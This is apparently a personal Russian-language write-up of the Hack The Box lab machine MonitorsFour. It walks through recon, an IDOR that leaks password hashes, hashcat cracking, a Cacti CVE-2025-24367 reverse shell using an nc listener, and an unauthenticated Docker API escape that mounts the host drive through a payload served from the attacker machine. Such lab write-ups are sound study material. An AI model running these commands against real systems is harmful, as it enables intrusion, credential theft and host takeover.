---
tags: [htb, lessons]
---

# Lessons Learned

- token=0 — классический edge-case для IDOR
- /user JSON endpoint — всегда проверять граничные значения
- Cacti — частая цель, старые версии критичны
- Docker API без auth = root почти гарантирован
- Docker Desktop + WSL2 ломает модель изоляции
- Нужно раньше проверять контейнеризацию

Добавить в KB:
- IDOR
- Docker API unauth
- WSL2 attack surface

# Расследование
##### nmap
```bash
COMMAND:
nmap -p- --min-rate 10000 10.10.10.245

STDOUT:
PORT STATE SERVICE  
80/tcp open http  
5985/tcp open wsman
```
##### ffuf
```bash
COMMAND:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://monitorsfour.htb \
-H "Host: FUZZ.monitorsfour.htb" -ac

STDOUT:
cacti     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 91ms]
```
##### feroxbuster
```bash
COMMAND:
feroxbuster -u http://monitorsfour.htb/ \
-w /usr/share/dirb/wordlists/common.txt \
-d 2 \
-C 404 \
--json -o ferox_root.json

STDOUT:
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://monitorsfour.htb/
 🚩  In-Scope Url          │ monitorsfour.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       19l       62w     3695c http://monitorsfour.htb/static/images/services/04.png
200      GET        1l      235w    12063c http://monitorsfour.htb/static/images/review.svg
200      GET        6l       34w     2166c http://monitorsfour.htb/static/images/services/02.png
200      GET       24l       99w      770c http://monitorsfour.htb/static/js/smoothscroll.js
200      GET       96l      239w     4340c http://monitorsfour.htb/login
200      GET        5l       30w     1616c http://monitorsfour.htb/static/images/services/01.png
200      GET       11l       15w      188c http://monitorsfour.htb/static/css/plugins.css
200      GET       38l      117w     2813c http://monitorsfour.htb/static/js/plugins.js
200      GET       71l      130w     1872c http://monitorsfour.htb/static/js/custom.js
200      GET        9l       43w     3028c http://monitorsfour.htb/static/images/services/03.png
200      GET        5l      369w    21003c http://monitorsfour.htb/static/js/popper.min.js
200      GET      109l      619w    13655c http://monitorsfour.htb/static/images/service.svg
200      GET        1l      393w    15974c http://monitorsfour.htb/static/images/about-us.svg
200      GET        1l      359w    22207c http://monitorsfour.htb/static/images/banner.svg
200      GET      129l      673w    57007c http://monitorsfour.htb/static/admin/assets/images/logo.png
200      GET      935l     1752w    15174c http://monitorsfour.htb/static/css/style.css
200      GET        7l      277w    44342c http://monitorsfour.htb/static/js/owl.carousel.min.js
200      GET        7l      683w    60010c http://monitorsfour.htb/static/js/bootstrap.min.js
200      GET        4l     1293w    86709c http://monitorsfour.htb/static/js/jquery-min.js
200      GET       87l     1326w   157954c http://monitorsfour.htb/static/admin/assets/images/logo.ico
200      GET      338l      982w    13688c http://monitorsfour.htb/
301      GET        7l       11w      162c http://monitorsfour.htb/controllers => http://monitorsfour.htb/controllers/
200      GET        4l       35w      367c http://monitorsfour.htb/contact
200      GET        6l      184w     9227c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/blockui.min.js
200      GET        2l      210w    12507c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/pace.min.js
200      GET        7l      430w    36816c http://monitorsfour.htb/static/admin/assets/js/core/libraries/bootstrap.min.js
200      GET      607l     1130w    16986c http://monitorsfour.htb/static/admin/assets/js/core/app.js
200      GET     1190l     1226w    47483c http://monitorsfour.htb/static/admin/assets/css/icons/icomoon/styles.css
200      GET        4l     1305w    84345c http://monitorsfour.htb/static/admin/assets/js/core/libraries/jquery.min.js
200      GET        1l        1w    37820c http://monitorsfour.htb/static/admin/assets/css/minified/colors.min.css
200      GET        1l     1733w   122310c http://monitorsfour.htb/static/admin/assets/css/minified/bootstrap.min.css
200      GET        1l     5059w   256503c http://monitorsfour.htb/static/admin/assets/css/minified/components.min.css
200      GET        1l     1430w   108349c http://monitorsfour.htb/static/admin/assets/css/minified/core.min.css
200      GET       84l      212w     3099c http://monitorsfour.htb/forgot-password
200      GET     4734l    29110w  2364586c http://monitorsfour.htb/static/admin/assets/images/servers.png
301      GET        7l       11w      162c http://monitorsfour.htb/static => http://monitorsfour.htb/static/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin => http://monitorsfour.htb/static/admin/
200      GET        1l        3w       35c http://monitorsfour.htb/user
301      GET        7l       11w      162c http://monitorsfour.htb/views => http://monitorsfour.htb/views/
301      GET        7l       11w      162c http://monitorsfour.htb/views/admin => http://monitorsfour.htb/views/admin/
301      GET        7l       11w      162c http://monitorsfour.htb/static/css => http://monitorsfour.htb/static/css/
301      GET        7l       11w      162c http://monitorsfour.htb/static/fonts => http://monitorsfour.htb/static/fonts/
301      GET        7l       11w      162c http://monitorsfour.htb/static/images => http://monitorsfour.htb/static/images/
301      GET        7l       11w      162c http://monitorsfour.htb/static/js => http://monitorsfour.htb/static/js/
200      GET      338l      982w    13688c http://monitorsfour.htb/views/index.php
[####################] - 3m     18549/18549   0s      found:45      errors:5
[####################] - 74s     4614/4614    62/s    http://monitorsfour.htb/
[####################] - 2m      4614/4614    44/s    http://monitorsfour.htb/controllers/
[####################] - 2m      4614/4614    39/s    http://monitorsfour.htb/static/
[####################] - 2m      4614/4614    42/s    http://monitorsfour.htb/views/
```
##### dev-tools
Cookie `PHPSESSID` указывает на PHP-приложение за Nginx, а значит, стоит искать типичные веб-уязвимости: SQL-инъекции, LFI, IDOR и так далее.
##### enumerate parameters
На веб-странице по пути `/user`  замечена ошибка
```bash
{"error":"Missing token parameter"}
```
Значит параметры принимаются прямо из url:
```bash
http://monitorsfour.htb/user?token=

{"error":"Invalid or missing token"}

http://monitorsfour.htb/user?token=0

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"e30c55680f63b1ea74","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75001.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```
При тестировании IDOR обычно перебирают значения: token=0, token=1, token=2 и так далее. Значение 0 часто либо вызывает ошибку, либо возвращает все записи из-за некорректной обработки граничных значений. Видимо, разработчики не предусмотрели проверку, запрос с `token=0` обходит фильтрацию и сервер отдаёт полный список пользователей с их MD5-хешами паролей. Классическая IDOR-уязвимость.
##### MD5 Decryption
Обнаружили MD5 хеши, кладем в файл:
```bash
cat > hashes.txt << EOF
56b32eb43e6f15395f6c46c1c9e1cd36
69196959c16b26ef00b77d82cf6eb169
2a22dcf99190c322d974c8df5ba3256b
8d4a7e7fd08555133e056d9aacb1e519
EOF
```
и пробуем расшифровать:
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz
```
Успешно.
```bash
hashcat -m 0 hashes.txt --show                                                                                                                                    
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
```
Далее подобрал пароль в ручную на сервисе http://cacti.monitorsfour.htb/cacti/, используя пару логина и пароля выше.
Обнаружил, что cacti использует старую версию. Использовал уязвимость cacti, https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

```
nc -lvnp 9001
```
и
```
sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.36 -l 9001
```
Попали в Docker container. Там первый флаг.
Далее поиск уязвимости Docker API на 2375
```
www-data@821fbd6a43fa:~/html/cacti$ for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
192.168.65.7:2375 OPEN
```
Docker API доступен без аутентификации, это **CVE-2025-9074** (CVSS 9.3), критическая уязвимость в Docker Desktop, позволяющая контейнерам подключаться к Docker Engine API через внутреннюю подсеть без аутентификации.
Теперь нужно создать контейнер, который примонтирует файловую систему хоста. На атакующей машине готовим JSON с конфигурацией. Ключевой момент тут параметр `Binds`, он монтирует диск C:\ хоста внутрь контейнера. Путь `/mnt/host/c`, так Docker Desktop на Windows видит файловую систему хоста через WSL2. Используем образ alpine, он уже есть на машине и весит минимально:

```
cat > /tmp/container.json << 'EOF'{  "Image": "alpine:latest",  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],  "HostConfig": {    "Binds": ["/mnt/host/c:/mnt/host_root"]  },  "Tty": true,  "OpenStdin": true}EOFcd /tmp && python3 -m http.server 8000
```
В контейнере скачиваем payload, создаём и запускаем контейнер через Docker API:

```
www-data@821fbd6a43fa:~/html/cacti$ curl http://10.10.14.36:8000/container.json -o /tmp/container.json

www-data@821fbd6a43fa:~/html/cacti$ curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"7d99df11ee0f9d29c093acb26f741bebda84e7d02c90097590c0791241075468","Warnings":[]}

www-data@821fbd6a43fa:~/html/cacti$ curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start

www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true
bdb6416e************************
```
